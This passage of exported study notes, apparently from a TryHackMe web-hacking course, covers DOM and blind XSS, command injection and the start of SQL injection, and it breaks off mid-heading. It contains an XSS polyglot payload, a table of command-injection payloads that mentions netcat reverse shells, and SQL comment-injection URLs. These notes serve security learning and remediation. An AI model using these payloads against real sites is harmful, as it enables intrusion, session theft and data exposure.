small example of these could be:</p><ul id="1bdc2e0a-5a69-43da-b3ba-1fb5946face9" class="bulleted-list"><li style="list-style-type:disc">Comments on a blog</li></ul><ul id="3511b4f6-3369-418c-98a6-109c0c3eb9bf" class="bulleted-list"><li style="list-style-type:disc">User profile information</li></ul><ul id="ad95cac5-57b2-44c3-8b5b-ca05cf2a20ab" class="bulleted-list"><li style="list-style-type:disc">Website Listings</li></ul><figure id="6d757c18-2f00-4e48-b478-37da173927fe" class="image"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/Untitled.png"><img style="width:1000px" src="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/Untitled.png"/></a></figure><h2 id="01e63203-83af-4325-82bc-2eb31e88edd8" class=""><mark class="highlight-blue"><strong>DOM (</strong></mark><strong>D</strong>ocument <strong>O</strong>bject <strong>M</strong>odel<mark class="highlight-blue"><strong>) Based XSS</strong></mark></h2><p id="628d66ba-40f6-4f84-b6fb-199d5562f67f" class="">Diagram of the HTML DOM is displayed below:</p><figure id="4148214a-2ce1-40ac-b6c8-8d3ac7e3c01f" class="image"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/Untitled%201.png"><img style="width:486px" src="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/Untitled%201.png"/></a></figure><p id="6847225d-a289-4508-a16b-74048fcd4b4a" class="">DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code. Execution occurs when the website JavaScript code acts on input or user interaction.</p><p id="25b07088-7f15-4c74-825e-0061df6819e4" class=""><strong>Example Scenario:</strong>The website&#x27;s JavaScript gets the contents from the <code>window.location.hash</code> parameter and then writes that onto the page in the currently being viewed section. The contents of the hash aren&#x27;t checked for malicious code, allowing an attacker to inject JavaScript of their choosing onto the webpage.<strong>Potential Impact:</strong>Crafted links could be sent to potential victims, redirecting them to another website or steal content from the page or the user&#x27;s session.</p><p id="c7d8ac5e-fb64-4fc3-9001-b0854a65a7ce" class=""><strong>How to test for Dom Based XSS:</strong></p><p id="59a7918d-b0ca-4659-8308-cb4620603d15" class="">DOM Based XSS can be challenging to test for and requires a certain amount of knowledge of JavaScript to read the source code. You&#x27;d need to look for parts of the code that access certain variables that an attacker can have control over, such as &quot;<strong>window.location.x</strong>&quot; parameters.</p><p id="49472293-e5f3-44ab-95aa-e0b5bfa01b81" class="">When you&#x27;ve found those bits of code, you&#x27;d then need to see how they are handled and whether the values are ever written to the web page&#x27;s DOM or passed to unsafe JavaScript methods such as <strong>eval()</strong>.</p><h2 id="4f132881-f4bf-451e-810d-a8525425faaf" class=""><mark class="highlight-blue">Blind XSS</mark></h2><p id="6ac05344-0586-4de6-8a82-ce7f28686d2d" class="">Blind XSS is similar to a stored XSS in that your payload gets stored on the website for another user to view, but in this instance, you can&#x27;t see the payload working or be able to test it against yourself first.</p><p id="692ea2ab-c507-4600-b94f-8a4d14415d54" class=""><strong>Potential Impact:</strong></p><p id="c4e36c0a-c1e2-45ce-adb1-187d87a2280e" class="">Using the correct payload, the attacker&#x27;s JavaScript could make calls back to an attacker&#x27;s website, revealing the staff portal URL, the staff member&#x27;s cookies, and even the contents of the portal page that is being viewed. Now the attacker could potentially hijack the staff member&#x27;s session and have access to the private portal.</p><p id="3deac0bf-f0cc-4e37-b11a-17861b35e9a6" class=""><strong>How to test for Blind XSS:</strong></p><p id="f7477ef9-e3d5-4dfe-aa96-85dbe5035567" class="">When testing for Blind XSS vulnerabilities, you need to ensure your payload has a call back (usually an HTTP request). This way, you know if and when your code is being executed.</p><p id="fbc750e9-6234-4b53-819b-eef97055f452" class="">A popular tool for Blind XSS attacks is <a href="https://xsshunter.com/">xsshunter</a>. Although it&#x27;s possible to make your own tool in JavaScript, this tool will automatically capture cookies, URLs, page contents and more.</p><div id="86c8d83e-b3cd-45ee-b3c2-3dcba2fb9fdd" class="collection-content"><h4 class="collection-title">XSS Practice Examples</h4><table class="collection-content"><thead><tr><th><span class="icon property-icon"><svg viewBox="0 0 16 16" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesTitle"><path d="M0.637695 13.1914C1.0957 13.1914 1.32812 13 1.47852 12.5215L2.24414 10.3887H6.14746L6.90625 12.5215C7.05664 13 7.2959 13.1914 7.74707 13.1914C8.22559 13.1914 8.5332 12.9043 8.5332 12.4531C8.5332 12.2891 8.50586 12.1523 8.44434 11.9678L5.41602 3.79199C5.2041 3.21777 4.82129 2.9375 4.19922 2.9375C3.60449 2.9375 3.21484 3.21777 3.0166 3.78516L-0.0322266 12.002C-0.09375 12.1797 -0.121094 12.3232 -0.121094 12.4668C-0.121094 12.918 0.166016 13.1914 0.637695 13.1914ZM2.63379 9.12402L4.17871 4.68066H4.21973L5.76465 9.12402H2.63379ZM12.2793 13.2324C13.3115 13.2324 14.2891 12.6787 14.7129 11.8037H14.7402V12.5762C14.7471 12.9863 15.0273 13.2393 15.4238 13.2393C15.834 13.2393 16.1143 12.9795 16.1143 12.5215V8.00977C16.1143 6.49902 14.9658 5.52148 13.1543 5.52148C11.7666 5.52148 10.6592 6.08887 10.2695 6.99121C10.1943 7.15527 10.1533 7.3125 10.1533 7.46289C10.1533 7.81152 10.4062 8.04395 10.7686 8.04395C11.0215 8.04395 11.2129 7.94824 11.3496 7.73633C11.7529 6.99121 12.2861 6.65625 13.1064 6.65625C14.0977 6.65625 14.6992 7.20996 14.6992 8.1123V8.67285L12.5664 8.7959C10.7686 8.8916 9.77734 9.69824 9.77734 11.0107C9.77734 12.3369 10.8096 13.2324 12.2793 13.2324ZM12.6621 12.1387C11.8008 12.1387 11.2129 11.667 11.2129 10.9561C11.2129 10.2725 11.7598 9.82129 12.7578 9.75977L14.6992 9.62988V10.3203C14.6992 11.3457 13.7969 12.1387 12.6621 12.1387Z"></path></svg></span>Name</th></tr></thead><tbody><tr id="6acf4858-aa51-4518-8e1f-d022220ef66f"><td class="cell-title"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/XSS%20Practice%20Examples%2086c8d83eb3cd45eeb3c23dcba2fb9fdd/1%20Perfecting%20Payload%206acf4858aa5145188e1fd022220ef66f.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/c1c509a263e7a42bece2f0b77fd1ba1b.png"/>1. Perfecting Payload</a></td></tr><tr id="b8b79582-f0b8-4fb7-86eb-6c2ac67167b3"><td class="cell-title"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/XSS%20Practice%20Examples%2086c8d83eb3cd45eeb3c23dcba2fb9fdd/2%20Perfecting%20Payload%20b8b79582f0b84fb786eb6c2ac67167b3.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/c1c509a263e7a42bece2f0b77fd1ba1b.png"/>2. Perfecting Payload</a></td></tr><tr id="52ee4d42-9bce-4eb7-b9dc-d9eabe5448f9"><td class="cell-title"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/XSS%20Practice%20Examples%2086c8d83eb3cd45eeb3c23dcba2fb9fdd/3%20Perfecting%20Payload%2052ee4d429bce4eb7b9dcd9eabe5448f9.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/c1c509a263e7a42bece2f0b77fd1ba1b.png"/>3. Perfecting Payload</a></td></tr><tr id="8c79a79a-2f20-4754-8b7c-5338cd1d4a18"><td class="cell-title"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/XSS%20Practice%20Examples%2086c8d83eb3cd45eeb3c23dcba2fb9fdd/4%20Perfecting%20Payload%208c79a79a2f2047548b7c5338cd1d4a18.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/c1c509a263e7a42bece2f0b77fd1ba1b.png"/>4. Perfecting Payload</a></td></tr><tr id="a39c4537-90c5-4c8c-a7b8-0910951e6ba0"><td class="cell-title"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/XSS%20Practice%20Examples%2086c8d83eb3cd45eeb3c23dcba2fb9fdd/5%20Perfecting%20Payload%20a39c453790c54c8ca7b80910951e6ba0.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/c1c509a263e7a42bece2f0b77fd1ba1b.png"/>5. Perfecting Payload</a></td></tr><tr id="2b46468a-0f15-4125-9468-b97366c46824"><td class="cell-title"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/XSS%20Practice%20Examples%2086c8d83eb3cd45eeb3c23dcba2fb9fdd/6%20Perfecting%20Payload%202b46468a0f1541259468b97366c46824.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/c1c509a263e7a42bece2f0b77fd1ba1b.png"/>6. Perfecting Payload</a></td></tr><tr id="ec9a9cc1-1a00-46a0-a396-3edeb2d35288"><td class="cell-title"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/XSS%20Practice%20Examples%2086c8d83eb3cd45eeb3c23dcba2fb9fdd/Practical%20Example%20(Blind%20XSS)%20ec9a9cc11a0046a0a3963edeb2d35288.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/c1c509a263e7a42bece2f0b77fd1ba1b.png"/>Practical Example (Blind XSS)</a></td></tr></tbody></table></div><p id="1daea364-3f94-443a-858b-82e03715b020" class=""><strong>Polyglots:</strong></p><p id="34da573a-55fa-4462-9f33-778dcc43f66d" class="">An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. You could have used the below polyglot on all six Perfecting Payload examples you&#x27;ve just seen, and it would have executed the code successfully:</p><pre id="c07009da-ed2c-4518-a640-e91a0f8d7ad9" class="code"><code>jaVasCript:///*\\/&#x27;/&quot;/**/(/* */onerror=alert(&#x27;THM&#x27;) )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert(&#x27;THM&#x27;)//&gt;\x3e</code></pre><h1 id="8d6d194e-9209-4215-b8ad-1293eb051f5f" class=""><em><mark class="highlight-yellow_background">Command Injection</mark></em></h1><p id="85c2e909-115e-4945-a23c-85071c7a8ffd" class="">Is the abuse of an application&#x27;s behavior to execute commands on the operating system, using the same privileges that the application on a device is running with. For example, achieving command injection on a web server running as a user named <code>joe</code> will execute commands under this <code>joe</code> user - and therefore obtain any permissions that <code>joe</code> has.</p><figure id="216fb9f4-27db-4d6c-8de7-8415d390f8db" class="image"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/Untitled%202.png"><img style="width:720px" src="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/Untitled%202.png"/></a></figure><p id="7da826d5-f423-438e-80a6-c1497d7b8760" class="">An attacker could abuse this application by injecting their own commands for the application to execute. Rather than using <code>grep</code> to search for an entry in <code>songtitle.txt</code>, they could ask the application to read data from a more sensitive file.</p><figure id="bd243ecb-a302-493c-85c0-b884edc95875" class="image"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/Untitled%203.png"><img style="width:902px" src="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/Untitled%203.png"/></a></figure><h2 id="ec82291f-d09a-4587-8657-0f4b4e1aab08" class=""><mark class="highlight-blue">Exploiting</mark></h2><p id="fccd4074-0957-4813-8e7f-7a835a2b7996" class="">Applications that use user input to populate system commands with data can often be combined in unintended behaviour. <strong>For example, the shell operators </strong><code><strong>;</strong></code><strong>, </strong><code><strong>&amp;</strong></code><strong> and </strong><code><strong>&amp;&amp;</strong></code><strong> will combine two (or more) system commands and execute them both.</strong></p><p id="a548e962-a49f-418f-82b3-6ee70e346f3a" class="">Command Injection can be detected in mostly one of two ways:</p><ol type="1" id="df9d0c07-359c-4e5a-bc76-32369063afd8" class="numbered-list" start="1"><li>Blind command injection</li></ol><ol type="1" id="821d724e-86bd-4a43-b132-fd346714f8e1" class="numbered-list" start="2"><li>Verbose command injection</li></ol><table id="38ade67c-0ae1-402d-a7d3-9e4daa86a6c5" class="simple-table"><tbody><tr id="910f978f-944b-4eb4-aa3c-871e6ce1dff2"><td id="tnPc" class=""><strong>Method</strong></td><td id="Qi]k" class="" style="width:682px"><strong>Description</strong></td></tr><tr id="207dba54-4de0-4b2e-b253-c5f0e822d36f"><td id="tnPc" class="">Blind</td><td id="Qi]k" class="" style="width:682px">This type of injection is where there is no direct output from the application when testing payloads. You will have to investigate the behaviors of the application to determine whether or not your payload was successful.</td></tr><tr id="b620d819-ddc3-4cbf-8e4f-a8c4e11c947f"><td id="tnPc" class="">Verbose</td><td id="Qi]k" class="" style="width:682px">This type of injection is where there is direct feedback from the application once you have tested a payload. For example, running the <code>whoami</code> command to see what user the application is running under. The web application will output the username on the page directly.</td></tr></tbody></table><h3 id="4776b451-e482-48e2-84eb-b10688006475" class="">Detecting Blind Command Injection</h3><p id="a86cb67e-a417-4e31-a220-4e8e6d25d61b" class="">Blind command injection is when command injection occurs; however, there is no output visible, so it is not immediately noticeable. For example, a command is executed, but the web application outputs no message.</p><p id="a77dc10c-b7b1-47b4-8f3b-00b3e17cd56a" class="">For this type of command injection, we will need to use payloads that will cause some time delay. For example, the <code>ping</code> and <code>sleep</code> commands are significant payloads to test with. Using <code>ping</code> as an example, the application will hang for <em>x</em> seconds in relation to how many <em>pings</em> you have specified.</p><h3 id="b92b1d2b-496a-4f40-98c9-b2b56cf85689" class="">Detecting Verbose Command Injection</h3><p id="4c3a20f9-9136-45fd-bee2-d4982c48cfad" class="">Detecting command injection this way is arguably the easiest method of the two. Verbose command injection is when the application gives you feedback or output as to what is happening or being executed.</p><p id="8b54d451-d24f-4e93-ae6f-a45b07276770" class="">For example, the output of commands such as <code>ping</code> or <code>whoami</code> is directly displayed on the web application.</p><h3 id="cbff7ac1-ae74-4956-9067-cac185fd12d2" class=""><mark class="highlight-pink">Useful payload</mark></h3><p id="bc87e840-ce58-4193-b7b1-18044dbf2fa9" class=""><span style="border-bottom:0.05em solid">Linux</span></p><table id="75b98b93-2ed3-41aa-b7e2-699e3004efa9" class="simple-table"><tbody><tr id="fc1b14db-8b7d-4f00-b17f-f20fe3471d50"><td id="EVhY" class="" style="width:69px"><strong>Payload</strong></td><td id="}:;d" class="" style="width:778.9927978515625px"><strong>Description</strong></td></tr><tr id="3bd6b2d9-a7bb-4707-9301-78373a57f591"><td id="EVhY" class="" style="width:69px">whoami</td><td id="}:;d" class="" style="width:778.9927978515625px">See what user the application is running under.</td></tr><tr id="4855294e-ea6a-4224-9ac3-3094b7a5955c"><td id="EVhY" class="" style="width:69px">ls</td><td id="}:;d" class="" style="width:778.9927978515625px">List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.</td></tr><tr id="890f3c9f-8296-4104-ac9a-cbc44f09f8c1"><td id="EVhY" class="" style="width:69px">ping</td><td id="}:;d" class="" style="width:778.9927978515625px">This command will invoke the application to hang. This will be useful in testing an application for blind command injection.</td></tr><tr id="89adb62a-d86d-490c-a273-11bd0c963f30"><td id="EVhY" class="" style="width:69px">sleep</td><td id="}:;d" class="" style="width:778.9927978515625px">This is another useful payload in testing an application for blind command injection, where the machine does not have <code>ping</code> installed.</td></tr><tr id="75668ca1-bf67-4d4f-ae85-c15546e300de"><td id="EVhY" class="" style="width:69px">nc</td><td id="}:;d" class="" style="width:778.9927978515625px">Netcat can be used to spawn a reverse shell onto the vulnerable application. You can use this foothold to navigate around the target machine for other services, files, or potential means of escalating privileges.</td></tr></tbody></table><p id="6d78825f-76ec-4b91-b403-185ff609e5a9" class=""><span style="border-bottom:0.05em solid">Windows</span></p><table id="c5628358-50db-448c-8bed-a0580127fbe3" class="simple-table"><tbody><tr id="0c857a90-4a2f-4295-842f-fa2132f856da"><td id="]a;M" class="" style="width:79px"><strong>Payload</strong></td><td id="pX}e" class="" style="width:783.9904174804688px"><strong>Description</strong></td></tr><tr id="2563c9c4-f054-4679-8151-c03ab6004077"><td id="]a;M" class="" style="width:79px">whoami</td><td id="pX}e" class="" style="width:783.9904174804688px">See what user the application is running under.</td></tr><tr id="502a12de-03c0-4469-90c2-eafa6c773c37"><td id="]a;M" class="" style="width:79px">dir</td><td id="pX}e" class="" style="width:783.9904174804688px">List the contents of the current directory. You may be able to find files such as configuration files, environment files (tokens and application keys), and many more valuable things.</td></tr><tr id="b4c4dc31-0240-4a0c-86c7-d0fc677b2b11"><td id="]a;M" class="" style="width:79px">ping</td><td id="pX}e" class="" style="width:783.9904174804688px">This command will invoke the application to hang. This will be useful in testing an application for blind command injection.</td></tr><tr id="cd13e50e-9d07-460c-930f-1c7ac6537962"><td id="]a;M" class="" style="width:79px">timeout</td><td id="pX}e" class="" style="width:783.9904174804688px">This command will also invoke the application to hang. It is also useful for testing an application for blind command injection if the <code>ping</code> command is not installed.</td></tr></tbody></table><h2 id="a744e2ae-e050-4bad-bcf3-2849d784906b" class=""><mark class="highlight-blue">Remediating</mark></h2><p id="ee02a1fe-2923-4156-8a4f-6672f9da8e3c" class="">In PHP, many functions interact with the operating system to execute commands via shell; these include:</p><ul id="aa8917b7-c38a-4ef2-b8d6-9255cb89c88c" class="bulleted-list"><li style="list-style-type:disc">Exec</li></ul><ul id="b96a6a3f-a0c5-4cf0-8707-79e1f1414f95" class="bulleted-list"><li style="list-style-type:disc">Passthru</li></ul><ul id="d5b51b7d-74bf-406f-8a7e-36c9645fd4ae" class="bulleted-list"><li style="list-style-type:disc">System</li></ul><p id="4a5e534e-239a-4a2d-ae2b-dfaeb1997fc6" class="">Take this snippet below as an example. Here, the application will only accept and process numbers that are inputted into the form. This means that any commands such as <code>whoami</code> will not be processed.</p><figure id="fd85f863-4960-4a73-91dd-821336e96c02" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/14acf436361fcfb7efced4b2f416b3d5.png"><img style="width:672px" src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/14acf436361fcfb7efced4b2f416b3d5.png"/></a></figure><ol type="1" id="81beae51-3dc1-4c54-bfa4-265ae5fc8414" class="numbered-list" start="1"><li>The application will only accept a specific pattern of characters (the digits 0-9)</li></ol><ol type="1" id="b6d787a5-5ef8-43dd-8ef3-41447a838405" class="numbered-list" start="2"><li>The application will then only proceed to execute this data which is all numerical.</li></ol><h3 id="78e9449d-9206-4d74-b53c-1041b7044eb1" class=""><strong>Input sanitisation</strong></h3><p id="0336abc9-d7b4-411a-a195-04c42b0c9a6c" class="">Sanitising any input from a user that an application uses is a great way to prevent command injection. This is a process of specifying the formats or types of data that a user can submit. For example, an input field that only accepts numerical data or removes any special characters such as <code>&gt;</code> ,  <code>&amp;</code> and <code>/</code>.</p><p id="6c31dbbc-b14a-417d-98f2-3eda3da1a85b" class="">In the snippet below, the <code>filter_input</code> <a href="https://www.php.net/manual/en/function.filter-input.php">PHP function</a> is used to check whether or not any data submitted via an input form is a number or not. If it is not a number, it must be invalid input.</p><figure id="b635cccb-345e-46ab-84a0-166c8712b6ca" class="image"><a href="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/06e83dfe3791664ed0bb9bc9ffd3e581.png"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5de96d9ca744773ea7ef8c00/room-content/06e83dfe3791664ed0bb9bc9ffd3e581.png"/></a></figure><h3 id="8d47ef0c-b92b-47c1-a660-1cee5046d56c" class="">Bypassing Filters</h3><figure id="a9727246-64b7-42a2-a888-62d60df05bb5" class="image"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/Untitled%204.png"><img style="width:720px" src="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/Untitled%204.png"/></a></figure><h1 id="d4a33a3b-f3e9-4d00-bb5f-384509e10646" class=""><em><mark class="highlight-yellow_background">SQL (Structured Query Language) Injection</mark></em></h1><p id="12e5c877-1d11-442f-969f-bc21e10f6d68" class="">Is an attack on a web application database server that causes malicious queries to be executed. When a web application communicates with a database using input from a user that hasn&#x27;t been properly validated, there runs the potential of an attacker being able to steal, delete or alter private and customer data and also attack the web applications authentication methods to private or customer areas. This is why as well as SQLi being one of the oldest web application vulnerabilities, it also can be the most damaging.</p><h3 id="6101464a-8aab-47f6-8c1b-96361075d8a6" class="">DataBases Structure</h3><figure id="ee2e92b7-bf12-4209-833d-27d32584f25e" class="image"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/Untitled%205.png"><img style="width:576px" src="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/Untitled%205.png"/></a></figure><h3 id="2116616b-6a1d-465f-84af-0c7414dc6b7c" class="">Tables Structure</h3><figure id="efe79114-21a9-4fdd-bb5c-8a39602cba6d" class="image"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/Untitled%206.png"><img style="width:672px" src="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/Untitled%206.png"/></a></figure><h3 id="af3df270-a31c-4cf6-a8cf-b221453b0683" class=""><mark class="highlight-yellow">Make sure to read: </mark><mark class="highlight-yellow"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQL%20Brief%20fae6d8a7600d4c709669f805f59a0e13.html"><span style="border-bottom:0.05em solid">SQL Brief</span></a></mark></h3><div id="bc925fa1-849d-4313-9b1e-b352619aa119" class="column-list"><div id="47d726fe-e5af-4d6a-9da7-cd3a6067b34e" style="width:25%" class="column"><figure id="fae6d8a7-600d-4c70-9669-f805f59a0e13" class="link-to-page"><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQL%20Brief%20fae6d8a7600d4c709669f805f59a0e13.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/86d8d3b6995ddad46f5d9142354b65b1.png"/>SQL Brief</a></figure></div><div id="a387c60f-68a2-437f-b4b9-93286aa2df94" style="width:25%" class="column"><p id="e260dcfa-b3bc-4c8c-9c9e-14cef149f58d" class=""><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQL%20Brief%20fae6d8a7600d4c709669f805f59a0e13.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/86d8d3b6995ddad46f5d9142354b65b1.png"/>SQL Brief</a> </p></div><div id="5ffedcca-d035-428d-997c-ca36c57cc107" style="width:25%" class="column"><p id="6111b7b8-05fc-4b7f-85db-b6fc1878d5ef" class=""><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQL%20Brief%20fae6d8a7600d4c709669f805f59a0e13.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/86d8d3b6995ddad46f5d9142354b65b1.png"/>SQL Brief</a> </p></div><div id="1453cb10-bfcf-4e1c-b4c6-e1be09794ce7" style="width:25%" class="column"><p id="36b747d1-3e72-4d35-9932-53dd80424c1d" class=""><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQL%20Brief%20fae6d8a7600d4c709669f805f59a0e13.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/86d8d3b6995ddad46f5d9142354b65b1.png"/>SQL Brief</a> </p></div></div><div id="398a608c-a5b6-453f-87ce-eb7a06c2a7cc" class="column-list"><div id="fcfc75d1-6858-488b-878a-33a7376b89bd" style="width:18.75%" class="column"><p id="2436686f-c591-4fa8-81b8-523e0a9e0b82" class=""><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQL%20Brief%20fae6d8a7600d4c709669f805f59a0e13.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/86d8d3b6995ddad46f5d9142354b65b1.png"/>SQL Brief</a> </p></div><div id="690c5cb3-9046-4dc2-b483-1420a5249e34" style="width:25%" class="column"><p id="a7460d06-3aeb-4e2c-9e5c-fb6cb8c7b472" class=""><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQL%20Brief%20fae6d8a7600d4c709669f805f59a0e13.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/86d8d3b6995ddad46f5d9142354b65b1.png"/>SQL Brief</a> </p></div><div id="00535341-9278-440d-911e-18e00f7119dc" style="width:18.75%" class="column"><p id="8a1a81b1-952d-487f-aa4b-cb0a1f05b6a7" class=""><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQL%20Brief%20fae6d8a7600d4c709669f805f59a0e13.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/86d8d3b6995ddad46f5d9142354b65b1.png"/>SQL Brief</a> </p></div><div id="9515a9cb-2efd-4146-b873-d679d35f6940" style="width:18.75%" class="column"><p id="a83a3d05-15b6-4c07-8bd2-1ab6816ef6b7" class=""><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQL%20Brief%20fae6d8a7600d4c709669f805f59a0e13.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/86d8d3b6995ddad46f5d9142354b65b1.png"/>SQL Brief</a> </p></div></div><div id="f2cdfb7d-6e85-4f75-88e8-45d2b1245ed4" class="column-list"><div id="9348d3c3-9e24-425e-ab46-050427f12515" style="width:18.75%" class="column"><p id="18fd4572-dc00-40af-8187-28d1a4c22a73" class=""><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQL%20Brief%20fae6d8a7600d4c709669f805f59a0e13.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/86d8d3b6995ddad46f5d9142354b65b1.png"/>SQL Brief</a> </p></div><div id="c39981c4-a3a1-46fa-9df2-dce0d2c9ba17" style="width:25%" class="column"><p id="34260858-2a23-4384-897f-5bbda4b5ccb3" class=""><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQL%20Brief%20fae6d8a7600d4c709669f805f59a0e13.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/86d8d3b6995ddad46f5d9142354b65b1.png"/>SQL Brief</a> </p></div><div id="eb7b1a19-b5dd-4fc0-b84b-6f162469d198" style="width:18.75%" class="column"><p id="c3414660-a79d-43bf-bf5b-91a79b841dbd" class=""><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQL%20Brief%20fae6d8a7600d4c709669f805f59a0e13.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/86d8d3b6995ddad46f5d9142354b65b1.png"/>SQL Brief</a> </p></div><div id="67fd3942-95f7-4572-a106-bbafbc0ca1fe" style="width:18.75%" class="column"><p id="aae0365d-81b3-46b4-a66e-a78a52c73604" class=""><a href="Introduction%20to%20Web%20Hacking%203aeb8fe40dad4018b370333c1107fbc2/SQL%20Brief%20fae6d8a7600d4c709669f805f59a0e13.html"><img class="icon" src="https://tryhackme-images.s3.amazonaws.com/room-icons/86d8d3b6995ddad46f5d9142354b65b1.png"/>SQL Brief</a> </p></div></div><h2 id="76ca5650-c304-4a5d-aa0b-0bd975aa8c29" class=""><strong><mark class="highlight-blue">SQL Injectoin</mark></strong></h2><p id="82e12fd0-9e76-401f-9484-e48e49c16654" class="">Scenario: The URL for each blog entry may look something like this:</p><p id="a6c380aa-aeff-4c55-a9af-0fc0e4a6816e" class=""><code>https://website.thm/blog?id=1</code></p><p id="8f091d13-8a9d-41b8-aba3-70c1b29ff09f" class="">From the URL above, you can see that the blog entry been selected comes from the id parameter in the query string. The web application needs to retrieve the article from the database and may use an SQL statement that looks something like the following:</p><p id="02c1474d-367a-4d35-91fb-65fa13070d3c" class=""><code>SELECT * from blog where id=1 and private=0 LIMIT 1;</code></p><p id="2f940be4-8888-40df-b03e-02aa4d8a8c59" class="">Let&#x27;s pretend article id 2 is still locked as private, so it cannot be viewed on the website. We could now instead call the URL:</p><p id="902e3931-7a44-4bf7-af93-37cb00093d44" class=""><code>https://website.thm/blog?id=2;--</code></p><p id="97be36e9-1959-40e3-bdfd-47d60f6dbc8a" class="">Which would then, in turn, produce the SQL statement:</p><p id="e53d4dc0-9041-4d6b-8c06-3b9c2840c724" class=""><code>SELECT * from blog where id=2;-- and private=0 LIMIT 1;</code></p><p id="67e485f9-0e20-477a-8696-f2401f4138e1" class=""><strong>The semicolon in the URL signifies the end of the SQL statement, and the two dashes cause everything afterwards to be treated as a comment</strong></p><p id="f3f6883e-8962-452d-8716-c7ad48e69916" class="">. By doing this, you&#x27;re just, in fact, running the query:</p><p id="0446732d-30a4-464e-9468-492b8497058c" class=""><code>SELECT * from blog where id=2;--</code></p><p id="2a23d1fe-69b1-4013-8364-7f4926cdaa10" class="">Which will return the article with an id of 2 whether it is set to public or not.</p><h2 id="f01598a4-d60b-42ca-a056-ec180a7d2a25" class=""><mark class="highlight-blue"><strong>In-Band SQL Injection</strong></mark></h2><p id="236dcaba-12cf-4614-855a-1c5f5609942c" class="">In-Band SQL Injection is the easiest type to detect and exploit; In-Band just refers to the same method of communication being used to exploit the vulnerability and also receive the results, for example, discovering an SQL Injection vulnerability on a website page and then being able to extract data from the database to the same page.</p><h3 id="18d47b94-84ba-4875-abeb-f05618fb4be9" class=""><strong>Error-Based SQL 